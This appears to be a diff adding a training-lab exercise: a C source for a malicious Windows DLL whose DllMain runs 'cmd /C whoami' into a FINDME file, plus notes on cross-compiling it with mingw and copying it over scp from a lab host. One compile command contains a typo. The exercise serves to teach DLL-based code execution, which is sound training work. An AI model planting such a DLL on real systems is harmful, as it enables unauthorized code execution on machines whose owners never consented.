@@ -1,0 +1,19 @@
+#include <windows.h>
+int execCommand()
+{
+ WinExec("cmd /C whoami > c:\\Users\\student\\exercise_2\\FINDME_1.txt", 1);
+ return 0;
+}
+BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
+{
+ execCommand();
+ return 0;
+}
+# Create Nano file on linux with code
+cd into folder with bad.c in it
+run the below command on the file
+i686-w64-mingw32-g++ -c bad.c -o bad.o
+686-w64-mingw32-g++ -shared -o bad.dll bad.o -Wl,--out-implib,bad.a
+# now move over to windows box
+scp student@10.50.34.63:/home/student/bad.dll .
+# THis will pull the file from the linux-ops to the windows machine
